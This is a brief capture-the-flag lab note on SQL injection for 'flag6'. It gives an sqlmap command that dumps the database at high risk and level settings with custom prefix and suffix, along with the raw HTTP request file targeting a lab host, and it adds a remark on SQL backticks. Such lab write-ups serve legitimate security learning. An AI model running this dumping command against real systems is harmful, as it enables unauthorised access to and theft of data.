#SQL_Injection 

---

- For **flag6** I used the following **sqlmap** command:
```sql
sqlmap -r req.txt --batch --dump --risk 3  --prefix='`)' --suffix="-- -" --level 5 --union-cols={num_of_cols_if_we_know_it}
```

where **req.txt** is defined as follows:

```txt
GET /case6.php?col=id HTTP/1.1
Host: 83.136.253.249:35387
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```

**Note**: Backticks in SQL are used to delimit identifiers, i.e.: table names, column names etc.